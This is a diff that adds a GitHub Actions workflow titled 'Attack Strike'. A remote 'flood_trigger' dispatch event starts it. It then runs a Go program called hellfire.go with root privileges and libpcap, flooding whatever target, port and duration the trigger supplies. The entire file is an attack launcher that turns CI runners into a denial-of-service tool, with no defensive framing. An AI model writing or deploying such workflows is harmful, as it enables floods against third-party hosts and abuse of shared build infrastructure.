@@ -1,0 +1,18 @@
+
+name: Attack Strike
+on:
+  repository_dispatch:
+    types: [flood_trigger]
+jobs:
+  strike:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run
+        run: |
+          sudo apt update && sudo apt install -y libpcap-dev
+          go mod init hellfire || true
+          sudo timeout ${{ github.event.client_payload.duration }}s go run hellfire.go \
+            -target ${{ github.event.client_payload.target }} \
+            -port ${{ github.event.client_payload.port }} \
+            -duration ${{ github.event.client_payload.duration }}
